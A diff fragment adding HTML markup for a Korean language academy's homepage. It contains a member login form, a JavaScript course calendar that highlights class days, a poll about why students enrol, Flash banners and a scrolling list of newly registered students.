+                                                                        <td width="194" valign="top"><a href="../easy/job_sub01.asp" onfocus='blur()' class="board"><!-- 내용 표시 -->TOEIC/TOEF...<!-- 신규 등록시 표시 --><br>
+                                                                  신입/경력(우대) / 상시모집</a></td>
+                                                                        <td width="100" align="right" class="num"><!-- 등록일 표시 -->2008-07-17</td>
+                                                                      </tr>
+                                                                  </table></td>
+                                                                </tr>
+                                                                <tr>
+                                                                  <td height="1" background="../images/line_dot.gif"></td>
+                                                                </tr>
+																
+                                                            </table><!-- 리스트 끝 --></td>
+                                                            <td width="1" bgcolor="#D9D9D9"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td><table width="371" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="3" height="3"><img src="../images/table_left_bot.gif"></td>
+                                                            <td height="3"><table width="365" border="0" cellspacing="0" cellpadding="0">
+                                                                <tr>
+                                                                  <td height="1" bgcolor="#D9D9D9"></td>
+                                                                </tr>
+                                                            </table></td>
+                                                            <td width="3" height="3"><img src="../images/table_right_bot.gif"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                </table><!-- 구인 정보 끝 --></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                    </table></td>
+                                  </tr>
+                              </table></td>
+                              <td width="230" align="center" valign="top" style="background-image:url('images/rig_bg.gif'); background-repeat:no-repeat;"><!-- 센터 오른쪽 부분 시작 --><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                  <tr>
+                                    <td width="200"><!-- MEMBER LOGIN 시작 --><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="200" height="28"><img src="../images/login_title.gif" width="85" height="13" hspace="5"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200" style="padding-top:5"><table width="200" border="0" cellspacing="0" cellpadding="0">
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+	function login(){
+		frm = document.loginform;
+		if (frm.memberid.value == ""){
+			alert("아이디를 입력하시기 바랍니다");
+			frm.memberid.focus();
+			return false;
+		}
+		if (frm.passwd.value == ""){
+			alert("패스워드를 입력하시기 바랍니다");
+			frm.passwd.focus();
+			return false;
+		}
+	}
+//-->
+</SCRIPT>
+<form name="loginform" action="https://www.easyedu.net:511/member/login_ok_1.asp" method="post" onSubmit="return login();">
+                                              <tr>
+                                                <td width="86"><!-- ID 입력 --><input type=text name=memberid value='' size="12" class="input2"></td>
+                                                <td width="86"><!-- PW 입력 --><input type=password name=passwd value='' size="12" class="input2"></td>
+                                                <td width="28"><!-- 로그인 버튼 --><input type = "image" src="../images/btn_go.gif" alt="로그인" width="28" height="18" border="0"></td>
+                                              </tr>
+<input type = "hidden" name = "return_url" value = "/main/main.asp?board_kind=">
+</form>
+
+                                          </table></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200" style="padding-top:5"><table width="200" border="0" cellspacing="0" cellpadding="0"><tr><!--로그인 되었을시, 하단 join Members 와 id/pw search 버튼이 btn_logout.gif와 btn_mypage.gif 로 링크와 같이 바뀌어야 합니다. -->
+
+                                              
+                                                <td width="86"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><!-- 회원가입 버튼 --><a href="../member/sub01_01.asp"  onFocus='blur()'><img src="../images/login_join.gif" alt="회원가입" width="63" height="15" border="0" align="absmiddle"></a></td>
+                                                <td width="114"><img src="../images/cross_icon.gif" width="3" height="3" hspace="5" align="absmiddle"><!-- ID/PW찾기 버튼 --><a href="../member/sub02_01.asp"  onFocus='blur()'><img src="../images/login_id_pw.gif" alt="ID/PW 찾기" width="64" height="15" border="0" align="absmiddle"></a></td>
+
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                    </table><!-- MEMBER LOGIN 끝 --></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" height="10"></td>
+                                  </tr>
+                                 
+ <tr>
+                                    <td width="200" align="center"><!-- 수강달력 시작 -->
+
+   
+									<table width="193" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="193"><table width="193" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td><img src="../images/car_title.gif" width="39" height="13" hspace="3" style="margin-top:5"></td>
+                                                    <td align="right"><!-- 이전 달 버튼 --><a href="?board_kind=&c_year=2013&c_month=11&next_priv=priv"><img src="../images/prev2_icon.gif" alt="이전 달" width="6" height="14" border="0" align="absmiddle" style="margin-right:7"></a><B><!-- 년도 표시 -->2013년</B> <!-- 월 표시 --><img src="../images/car_m_11.gif" width="20" height="19"><B>월</B><!-- 다음  달 버튼 --><a href="?board_kind=&c_year=2013&c_month=11&next_priv=next"><img src="../images/next2_icon.gif" alt="다음 달" width="6" height="14" border="0" align="absmiddle" style="margin-left:7"></a></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                     <tr>
+                                          <td width="200" align="center" valign="middle" style="padding-top:7"><table width="193" border="0" cellspacing="0" cellpadding="0" class="board_table">
+                                              <tr>
+                                                <td align="center" valign="middle" style="padding-top:5"><table width="183" border="0" cellspacing="0" cellpadding="0">
+                                                    <tr>
+                                                      <td width="183"><img src="../images/car_day.gif" width="183" height="22"></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td width="183"><table width="183" border="0" cellspacing="0" cellpadding="0"  class="board_table">
+                                                          <tr>
+                                                            <td style="padding-top:5"><!-- 달력 시작 (아래의 주 5일반~모의JPT 까지의 메뉴 마우스 오버시 해당 날짜 표시되어야 합니다.)--><table width="175" border="0" cellspacing="1" cellpadding="0" bgcolor=FFFFFF>
+                                                                <tr>
+
+     <tr>
+	<td width="24" height="20" align="right" >&nbsp;</td><td width="24" height="20" align="right" >&nbsp;</td><td width="24" height="20" align="right" >&nbsp;</td><td width="24" height="20" align="right" >&nbsp;</td><td width="24" height="20" align="right" >&nbsp;</td><td width="24" height="20" align="right"   id = "td_1">1</td><td width="24" height="20" align="right"   id = "td_2">2</td>
+      </tr>
+
+     <tr>
+	<td width="24" height="20" align="right"   id = "td_3">3</td><td width="24" height="20" align="right"   id = "td_4">4</td><td width="24" height="20" align="right"   id = "td_5">5</td><td width="24" height="20" align="right"   id = "td_6">6</td><td width="24" height="20" align="right"   id = "td_7">7</td><td width="24" height="20" align="right"   id = "td_8">8</td><td width="24" height="20" align="right"   id = "td_9">9</td>
+      </tr>
+
+     <tr>
+	<td width="24" height="20" align="right"   id = "td_10">10</td><td width="24" height="20" align="right"   id = "td_11">11</td><td width="24" height="20" align="right"   id = "td_12">12</td><td width="24" height="20" align="right"   id = "td_13">13</td><td width="24" height="20" align="right"   id = "td_14">14</td><td width="24" height="20" align="right"   id = "td_15">15</td><td width="24" height="20" align="right"   id = "td_16">16</td>
+      </tr>
+
+     <tr>
+	<td width="24" height="20" align="right"   id = "td_17">17</td><td width="24" height="20" align="right"   id = "td_18">18</td><td width="24" height="20" align="right"   id = "td_19">19</td><td width="24" height="20" align="right"   id = "td_20">20</td><td width="24" height="20" align="right"   id = "td_21">21</td><td width="24" height="20" align="right"   id = "td_22">22</td><td width="24" height="20" align="right"   id = "td_23">23</td>
+      </tr>
+
+     <tr>
+	<td width="24" height="20" align="right"   id = "td_24">24</td><td width="24" height="20" align="right"   id = "td_25">25</td><td width="24" height="20" align="right"   id = "td_26">26</td><td width="24" height="20" align="right"   id = "td_27">27</td><td width="24" height="20" align="right"   id = "td_28">28</td><td width="24" height="20" align="right"   id = "td_29">29</td><td width="24" height="20" align="right"   id = "td_30">30</td>
+      </tr>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+	function kind(me){
+
+		if (me == 2){
+			
+				document.getElementById('td_1').style.background = "#C40000";
+				document.getElementById('td_1').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_4').style.background = "#C40000";
+				document.getElementById('td_4').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_5').style.background = "#C40000";
+				document.getElementById('td_5').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_6').style.background = "#C40000";
+				document.getElementById('td_6').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_12').style.background = "#C40000";
+				document.getElementById('td_12').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_13').style.background = "#C40000";
+				document.getElementById('td_13').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_14').style.background = "#C40000";
+				document.getElementById('td_14').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_15').style.background = "#C40000";
+				document.getElementById('td_15').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_18').style.background = "#C40000";
+				document.getElementById('td_18').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_28').style.background = "#C40000";
+				document.getElementById('td_28').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_27').style.background = "#C40000";
+				document.getElementById('td_27').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_26').style.background = "#C40000";
+				document.getElementById('td_26').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_25').style.background = "#C40000";
+				document.getElementById('td_25').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_7').style.background = "#C40000";
+				document.getElementById('td_7').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_8').style.background = "#C40000";
+				document.getElementById('td_8').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_11').style.background = "#C40000";
+				document.getElementById('td_11').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_19').style.background = "#C40000";
+				document.getElementById('td_19').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_20').style.background = "#C40000";
+				document.getElementById('td_20').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_21').style.background = "#C40000";
+				document.getElementById('td_21').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_22').style.background = "#C40000";
+				document.getElementById('td_22').style.color = "#FFFFFF";
+
+			
+				document.getElementById('td_29').style.background = "#C40000";
+				document.getElementById('td_29').style.color = "#FFFFFF";
+
+			
+		}
+		if (me == 3){
+			
+				document.getElementById('td_15').style.background = "#C6C600";
+				document.getElementById('td_15').style.color = "#FFFFFF";
+			
+				document.getElementById('td_4').style.background = "#C6C600";
+				document.getElementById('td_4').style.color = "#FFFFFF";
+			
+				document.getElementById('td_11').style.background = "#C6C600";
+				document.getElementById('td_11').style.color = "#FFFFFF";
+			
+				document.getElementById('td_18').style.background = "#C6C600";
+				document.getElementById('td_18').style.color = "#FFFFFF";
+			
+				document.getElementById('td_25').style.background = "#C6C600";
+				document.getElementById('td_25').style.color = "#FFFFFF";
+			
+				document.getElementById('td_6').style.background = "#C6C600";
+				document.getElementById('td_6').style.color = "#FFFFFF";
+			
+				document.getElementById('td_13').style.background = "#C6C600";
+				document.getElementById('td_13').style.color = "#FFFFFF";
+			
+				document.getElementById('td_20').style.background = "#C6C600";
+				document.getElementById('td_20').style.color = "#FFFFFF";
+			
+				document.getElementById('td_27').style.background = "#C6C600";
+				document.getElementById('td_27').style.color = "#FFFFFF";
+			
+				document.getElementById('td_29').style.background = "#C6C600";
+				document.getElementById('td_29').style.color = "#FFFFFF";
+			
+		}
+		if (me == 4){
+			
+				document.getElementById('td_5').style.background = "#C6C600";
+				document.getElementById('td_5').style.color = "#FFFFFF";
+			
+				document.getElementById('td_12').style.background = "#C6C600";
+				document.getElementById('td_12').style.color = "#FFFFFF";
+			
+				document.getElementById('td_19').style.background = "#C6C600";
+				document.getElementById('td_19').style.color = "#FFFFFF";
+			
+				document.getElementById('td_26').style.background = "#C6C600";
+				document.getElementById('td_26').style.color = "#FFFFFF";
+			
+				document.getElementById('td_7').style.background = "#C6C600";
+				document.getElementById('td_7').style.color = "#FFFFFF";
+			
+				document.getElementById('td_14').style.background = "#C6C600";
+				document.getElementById('td_14').style.color = "#FFFFFF";
+			
+				document.getElementById('td_21').style.background = "#C6C600";
+				document.getElementById('td_21').style.color = "#FFFFFF";
+			
+				document.getElementById('td_28').style.background = "#C6C600";
+				document.getElementById('td_28').style.color = "#FFFFFF";
+			
+				document.getElementById('td_22').style.background = "#C6C600";
+				document.getElementById('td_22').style.color = "#FFFFFF";
+			
+				document.getElementById('td_8').style.background = "#C6C600";
+				document.getElementById('td_8').style.color = "#FFFFFF";
+			
+		}
+		if (me == 7){
+			
+				document.getElementById('td_9').style.background = "#00E8E8";
+				document.getElementById('td_9').style.color = "#FFFFFF";
+			
+				document.getElementById('td_16').style.background = "#00E8E8";
+				document.getElementById('td_16').style.color = "#FFFFFF";
+			
+				document.getElementById('td_23').style.background = "#00E8E8";
+				document.getElementById('td_23').style.color = "#FFFFFF";
+			
+				document.getElementById('td_30').style.background = "#00E8E8";
+				document.getElementById('td_30').style.color = "#FFFFFF";
+			
+		}
+		if (me == 8){
+			
+				document.getElementById('td_10').style.background = "#006600";
+				document.getElementById('td_10').style.color = "#FFFFFF";
+			
+				document.getElementById('td_17').style.background = "#006600";
+				document.getElementById('td_17').style.color = "#FFFFFF";
+			
+				document.getElementById('td_24').style.background = "#006600";
+				document.getElementById('td_24').style.color = "#FFFFFF";
+			
+				document.getElementById('td_3').style.background = "#006600";
+				document.getElementById('td_3').style.color = "#FFFFFF";
+			
+		}
+		if (me == 6){
+			
+		}
+		if (me == 12){
+			
+		}
+	}
+	function kind_out(){
+		
+				document.getElementById('td_1').style.background = "#FFFFFF";
+				document.getElementById('td_1').style.color = "#000000";
+		
+				document.getElementById('td_2').style.background = "#FFFFFF";
+				document.getElementById('td_2').style.color = "#000000";
+		
+				document.getElementById('td_3').style.background = "#FFFFFF";
+				document.getElementById('td_3').style.color = "#000000";
+		
+				document.getElementById('td_4').style.background = "#FFFFFF";
+				document.getElementById('td_4').style.color = "#000000";
+		
+				document.getElementById('td_5').style.background = "#FFFFFF";
+				document.getElementById('td_5').style.color = "#000000";
+		
+				document.getElementById('td_6').style.background = "#FFFFFF";
+				document.getElementById('td_6').style.color = "#000000";
+		
+				document.getElementById('td_7').style.background = "#FFFFFF";
+				document.getElementById('td_7').style.color = "#000000";
+		
+				document.getElementById('td_8').style.background = "#FFFFFF";
+				document.getElementById('td_8').style.color = "#000000";
+		
+				document.getElementById('td_9').style.background = "#FFFFFF";
+				document.getElementById('td_9').style.color = "#000000";
+		
+				document.getElementById('td_10').style.background = "#FFFFFF";
+				document.getElementById('td_10').style.color = "#000000";
+		
+				document.getElementById('td_11').style.background = "#FFFFFF";
+				document.getElementById('td_11').style.color = "#000000";
+		
+				document.getElementById('td_12').style.background = "#FFFFFF";
+				document.getElementById('td_12').style.color = "#000000";
+		
+				document.getElementById('td_13').style.background = "#FFFFFF";
+				document.getElementById('td_13').style.color = "#000000";
+		
+				document.getElementById('td_14').style.background = "#FFFFFF";
+				document.getElementById('td_14').style.color = "#000000";
+		
+				document.getElementById('td_15').style.background = "#FFFFFF";
+				document.getElementById('td_15').style.color = "#000000";
+		
+				document.getElementById('td_16').style.background = "#FFFFFF";
+				document.getElementById('td_16').style.color = "#000000";
+		
+				document.getElementById('td_17').style.background = "#FFFFFF";
+				document.getElementById('td_17').style.color = "#000000";
+		
+				document.getElementById('td_18').style.background = "#FFFFFF";
+				document.getElementById('td_18').style.color = "#000000";
+		
+				document.getElementById('td_19').style.background = "#FFFFFF";
+				document.getElementById('td_19').style.color = "#000000";
+		
+				document.getElementById('td_20').style.background = "#FFFFFF";
+				document.getElementById('td_20').style.color = "#000000";
+		
+				document.getElementById('td_21').style.background = "#FFFFFF";
+				document.getElementById('td_21').style.color = "#000000";
+		
+				document.getElementById('td_22').style.background = "#FFFFFF";
+				document.getElementById('td_22').style.color = "#000000";
+		
+				document.getElementById('td_23').style.background = "#FFFFFF";
+				document.getElementById('td_23').style.color = "#000000";
+		
+				document.getElementById('td_24').style.background = "#FFFFFF";
+				document.getElementById('td_24').style.color = "#000000";
+		
+				document.getElementById('td_25').style.background = "#FFFFFF";
+				document.getElementById('td_25').style.color = "#000000";
+		
+				document.getElementById('td_26').style.background = "#FFFFFF";
+				document.getElementById('td_26').style.color = "#000000";
+		
+				document.getElementById('td_27').style.background = "#FFFFFF";
+				document.getElementById('td_27').style.color = "#000000";
+		
+				document.getElementById('td_28').style.background = "#FFFFFF";
+				document.getElementById('td_28').style.color = "#000000";
+		
+				document.getElementById('td_29').style.background = "#FFFFFF";
+				document.getElementById('td_29').style.color = "#000000";
+		
+				document.getElementById('td_30').style.background = "#FFFFFF";
+				document.getElementById('td_30').style.color = "#000000";
+		
+	}
+//-->
+</SCRIPT>
+                                                               
+                                                            </table><!-- 달력 끝 --></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td width="183" align="center" style="padding-top:5; padding-bottom:5"><table width="183" border="0" cellspacing="0" cellpadding="0">
+                                                          <tr>
+                                                            <td width="10"></td>
+                                                            <td width="29"><img src="../images/car_b01.gif" alt="주 5일반" width="19" height="29" border="0" style = "cursor:hand" onmouseover = "javascript:kind(2);" onMouseOut="javascript:kind_out();"></td>
+                                                            <td width="29"><img src="../images/car_b02_1.gif" alt="주 3일반" width="22" height="29" border="0" style = "cursor:hand" onmouseover = "javascript:kind(3);" onMouseOut="javascript:kind_out();"></td>
+															<td width="29"><img src="../images/car_b02_2.gif" alt="주 3일반" width="22" height="29" border="0" style = "cursor:hand" onmouseover = "javascript:kind(4);" onMouseOut="javascript:kind_out();"></td>
+                                                            <td width="30"><img src="../images/car_b03.gif" alt="토요일반" width="22" height="29" border="0" style = "cursor:hand" onmouseover = "javascript:kind(7);" onMouseOut="javascript:kind_out();"></td>
+                                                            <td width="31"><img src="../images/car_b04.gif" alt="일요일반" width="21" height="29" border="0"  style = "cursor:hand" onmouseover = "javascript:kind(8);" onMouseOut="javascript:kind_out();"></td>
+                                                            <td width="27"><img src="../images/car_b05.gif" alt="모의토익" width="17" height="29" border="0"  style = "cursor:hand" onmouseover = "javascript:kind(6);" onMouseOut="javascript:kind_out();"></td>
+                                                            <td width="27"><img src="../images/car_b06.gif" alt="모의 JPT" width="17" height="29" border="0"  style = "cursor:hand" onmouseover = "javascript:kind(12);" onMouseOut="javascript:kind_out();"></td>
+                                                          </tr>
+                                                      </table></td>
+                                                    </tr>
+                                                </table></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                    </table><!-- 수강달력 끝 --></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" height="15"></td>
+                                  </tr>
+								   <tr>
+                                    <td width="200" align="center"><!-- 동영상시작 -->
+                                      <embed src="../main/images/3summer.wmv" loop="-1" volume="0" showcontrols="1" width=200 height=220 AUTOSTART="-1" type="video/x-ms-wmv"></embed><!-- 동영상끝 -->
+                                  </tr>
+								   <tr>
+                                    <td width="200" height="15" align="center"><a href="/easy1/sub10_01.asp"><img src="../images/uccclick.gif" width="200" height="30"></a></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" height="15"></td>
+                                  </tr>
+                                  
+                                  <!-- <tr>
+                                    <td width="200"><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="200"><img src="images/rig_stu_title.gif" width="39" height="13"></td>
+                                        </tr>
+										<tr>
+											<td width="200" height="5"></td>
+										</tr>
+                                        <tr>
+                                          <td width="200" height="2" bgcolor="#6885BD"></td>
+                                        </tr>
+                                        <tr>
+                                              <td width="200" style="padding-top:7"><!-- 강좌안내 플래시 시작 <script src="../include/flash.js"></script>
+<script>var ff = mf("images/easy_lesson.swf?pageNum=1", "id", 200, 352, "transparent");documentwrite(ff);</script><!-- 강좌안내 플래시 끝 </td>
+                                        </tr>
+                                    </table></td>
+                                  </tr> -->
+                                  <tr>
+                                    <td width="200" height="145" valign="top" style="background-image:url('images/rig_less_bg.gif'); background-repeat:no-repeat;"><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="200" align="right" style="padding-top:18"><img src="images/rig_less_title.gif" width="146" height="19" hspace="5"></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200" align="center" style="padding-top:9"><!-- 배움마을 메뉴 플래시 시작 --><img src="images/rig_less_flash_new.gif" width="190" height="83" border="0" usemap="#rig_less"><!-- 배움마을 메뉴 플래시 끝 --></td>
+                                        </tr>
+                                    </table></td>
+                                  </tr>
+								  <tr>
+                                    <td width="200" height="10"></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" style="padding-top:5"><a href="../easy1/sub05_01_11.asp" onfocus='blur()'><img src="images/rig_baner01.gif" alt="시험 정보 안내" width="200" height="48" border="0"></a></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" style="padding-top:3"><a href="../member/sub03_01.asp" onfocus='blur()'><img src="images/rig_baner02.gif" alt="강의 참여 설문조사" width="200" height="48" border="0"></a></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" style="padding-top:3"><a href="../easy/b_sub01_01.asp" onfocus='blur()'><img src="images/rig_baner03.gif" alt="기업/학교 출장강의" width="200" height="48" border="0"></a></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" height="15"></td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200"><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="200"><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="100"><img src="images/rig_on_title.gif" width="74" height="12"></td>
+                                                <td width="100" align="right"><a href="../easy1/sub07_05.asp"  onFocus='blur()'><img src="../images/btn_more.gif" alt="more" width="37" height="12" border="0" align="absmiddle"></a></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200"><table width="200" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td height="7"></td>
+                                              </tr>
+                                              <tr>
+                                                <td height="2" bgcolor="E1E1E1"></td>
+                                              </tr>
+                                              <tr>
+                                                <td height="2"></td>
+                                              </tr>
+                                          </table></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200" align="center" bgcolor="F7F7F7"><!-- 온라인설문조사 시작 --><table width="180" border="0" cellspacing="0" cellpadding="0">
+	  <form name="pollform" method=post>
+  
+	  <input type = "hidden" name = "answer">
+	  <input type = "hidden" name = "idx" value = "22">
+                                              <tr>
+                                                    <td width="180" style="padding-top:10">
+                                                      <!--질문 표시 -->
+                                                      이지외국어학원에 많은 사람들이 오는  이유가  무엇이라고 생각합니까?</td>
+                                              </tr>
+                                              <tr>
+                                                    <td width="180" style="padding-top:5; padding-bottom:10"> 
+                                                      <!--내용 표시 -->
+                                                      
+                <input type="radio" name="answer1" value="1" onclick = "javascript:document.pollform.answer.value=this.value;">지리적인 위치가 좋다.<br>
+			  
+                <input type="radio" name="answer1" value="2" onclick = "javascript:document.pollform.answer.value=this.value;">강사가 잘 가르친다.<br>
+			  
+                <input type="radio" name="answer1" value="3" onclick = "javascript:document.pollform.answer.value=this.value;">광고 때문이다.<br>
+			  
+                <input type="radio" name="answer1" value="4" onclick = "javascript:document.pollform.answer.value=this.value;">학생들에게 서비스가 좋다.<br>
+			  
+                <input type="radio" name="answer1" value="5" onclick = "javascript:document.pollform.answer.value=this.value;">좋다는 소문을 많이 들었다.<br>
+			  </td>
+                                              </tr>
+											  
+
+                                          </table><!-- 온라인설문조사 끝 --></td>
+                                        </tr>
+                                        <tr>
+                                          <td width="200" align="right" style="padding-top:8"><a href="javascript:poll_ok();"  onFocus='blur()' ><img src="../images/btn_too_01.gif" alt="투표하기" width="60" height="19" hspace="8" border="0"></a><!-- 해당 온라인 설문조사 결과페이지로 링크--><a href="../easy1/sub07_05.asp"  onFocus='blur()'><img src="../images/btn_too_02.gif" alt="결과보기" width="60" height="19" border="0"></a></td>
+                                        </tr>
+</form>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+	function poll_ok(){
+		frm = document.pollform;
+		if (frm.answer.value == ""){
+			alert("설문 항목을 반드시 한개는 선택하셔야 투표를 진행하실 수 있습니다");
+			return;
+		}
+		frm.action = "/easy1/sub07_05.asp";
+		frm.submit();
+	}
+
+//-->
+</SCRIPT>
+                                    </table>
+									</td>
+                                  </tr>
+                                  <tr>
+                                    <td width="200" height="15"></td>
+                                  </tr>
+                              </table><!-- 센터 오른쪽 부분 끝 --></td>
+                            </tr>
+                        </table></td>
+                      </tr>
+                      <tr>
+                        <td width="840" height="1" align="left" valign="top" bgcolor="E5E5E5"></td>
+                      </tr>
+                      <tr>
+                        <td width="840" align="left" valign="top" style="padding-top:10"><!-- 제휴사 배너 FLASH 시작 -->
+                              <table width="840" height="61" border="0" cellpadding="0" cellspacing="0">
+                                <tr> 
+                                  <td background="../images/banner_bg.gif"><script src="../include/flash.js"></script>
+<script>var ff = mf("../images/wpgb.swf", "id", 840, 98, "transparent");documentwrite(ff);</script></td>
+                                </tr>
+                              </table>
+                              <!-- 제휴사 배너 FLASH 끝 --></td>
+                      </tr>
+                      <tr>
+                        <td width="840" height="10" align="left" valign="top"></td>
+                      </tr>
+                  </table></td>
+                  <!-- 센터부분 끝 -->
+                 			  
+				  <td width="7"></td>
+                  <td width="136" valign="top"><!-- 오른쪽 시작 --><table width="136" border="0" cellspacing="0" cellpadding="0">
+                          <tr> 
+                            <td width="130" align="center"><table width="130" height="127" border="0" cellpadding="0" cellspacing="0">
+                              <!-- dday 시작
+                              <tr>                             
+                                    <td width="130" align="left" valign="top"><script src="../include/flash.js"></script>
+<script>var ff = mf("../main/images/dday.swf", "id", 130, 127, "transparent");documentwrite(ff);</script></td>                               </tr>
+                               <tr> dday 끝 -->
+                                <td>&nbsp;</td>
+                              </tr>
+                              <tr>
+                                <td><img src="../images/e_quick_link1.gif" width="130" height="333" border="0" usemap="#Map">
+                                  <map name="Map">
+                                    <area shape="rect" coords="6,267,67,327" href="../easy1/sub08_01(1).asp" target="_self"  onFocus='blur()'>
+                                    <area shape="rect" coords="67,209,123,269" href="/member/sub03_01.asp" target="_self"  onFocus='blur()'>
+                                    <area shape="rect" coords="68,150,124,210" href="../easy/b_sub01_01.asp" target="_self"  onFocus='blur()'>
+                                    <area shape="rect" coords="8,32,66,89" href="../easy1/sub07_02.asp" target="_self">
+                                    <area shape="rect" coords="67,31,122,87" href="../easy/finish.asp" target="_self">
+									<!--  <area shape="rect" coords="66,93,123,150" href="../easy1/sub07_01.asp?inc=/include/view.asp&no=352&table=tbboard_news&easy=easy1" target="_self">  -->
+                                  <area shape="rect" coords="66,93,123,150" href="../easy1/sub03_01.asp" target="_self">
+                                    <area shape="rect" coords="5,95,63,152" href="#" onClick="window.open ('http://easyedu.net/renew/ecatalog/easybook.asp', 
+'new' ,'scrollbars=0, top=0, left=0, width=1000, height=750')" onfocus='this.blur()'>
+                                    <area shape="rect" coords="6,211,64,267" href="../easy1/sub07_03.asp" target="_self">
+                                    <area shape="rect" coords="8,152,64,208" href="../easy/work_sub01.asp" target="_self">
+                                  <area shape="rect" coords="66,268,124,326" href="../easy1/sub03_02.asp" target="_self">
+                                  </map></td>
+                              </tr>
+                              <tr>
+                                <td>&nbsp;</td>
+                              </tr>
+                              <tr>
+                                <td><table width="136" border="0" cellspacing="0" cellpadding="0">
+                                  <tr>
+                                    <td><img src="../images/link_05_top.gif" width="136" height="24"></td>
+                                  </tr>
+                                  <tr>
+                                    
+                                    <td align="center"><table width="136" border="0" cellspacing="0" cellpadding="0">
+                                        <tr>
+                                          <td width="1" bgcolor="A6A6A6"></td>
+                                          <td width="134" align="center" style="padding-top:8; padding-bottom:8"><table width="130" border="0" cellspacing="0" cellpadding="0">
+                                              <tr>
+                                                <td width="130" align="center"  style="padding-bottom:5"><font color="#419215"><strong>
+                                                  <!-- 오늘 날짜 표시 -->2013-11-29<!-- 오늘 등록 명수 표시 -->
+                                                  총11명</strong></font></td>
+                                              </tr>
+                                              <tr>
+                                                <td height="1" background="../images/line_dot_strong.gif"></td>
+                                              </tr>
+                                              <tr>
+                                                <td width="130" style="padding-top:7; padding-left:5"><!-- 사람 이름 표시 -->
+                                                    <marquee id="mq_notice" scrollamount="2" scrolldelay="25" direction="up" width="120" height="150" style="border:0 solid #333333; padding:5">
+                                                  <a onMouseOver=Marq(1) onMouseOut=Marq(2)>
+                                                  이주리(영어회화)<br>
+                                                    성재경(영어회화)<br>
+                                                    김현기(영어회화)<br>
+                                                    이경미(토익)<br>
+                                                    김하늘(토익)<br>
+                                                    박인우(토익)<br>
+                                                    이준우(토익)<br>
+                                                    신보경(토플)<br>
+                                                    유효정(영어회화)<br>
+                                                    박일환(영어회화)<br>
+                                                    송원석(영어회화)<br>
+                                                    
+                                                  <a>
+                                                  </marquee></td>
+                                                <SCRIPT LANGUAGE="JavaScript">
+<!--
+function Marq(kind)
+{ 
+switch(kind) {
+case 1:
+mq_notice.stop();
+break;
+}
+switch(kind) {
+case 2:
+mq_notice.start();
+break;
+} 
+}
+//-->
+                                </SCRIPT>
+                                              </tr>
+                                          </table></td>
+                                          <td width="1" bgcolor="A6A6A6"></td>
+                                        </tr>
+                                    </table></td>
+                                  </tr>
+                                  <tr>
+                                    <td><img src="../images/link_04_bot.gif" width="136" height="3"></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="10">&nbsp;</td>
+                                  </tr>
+                                </table></td>
+                              </tr>
+                            </table> 
+                              <!-- 오른쪽 퀵메뉴 시작 --><!-- 오른쪽 퀵메뉴 끝 -->                            </td>
+                          </tr>
+                          <tr> 
+                            <td width="136"> 
+                              <!-- 이벤트/기타 배너 시작 (가로사이즈 고정)-->
+							  
+                              <!-- 이벤트/기타 배너 끝 -->
+                            </td>
+                          </tr>
+                          <tr> 
+                            <td width="136" height="10"></td>
+                          </tr>
+                          <tr> 
+                            <td width="136"><!-- 취업/승진/시험 시작 --><table width="136" border="0" cellspacing="0" cellpadding="0">
+                                <tr> 
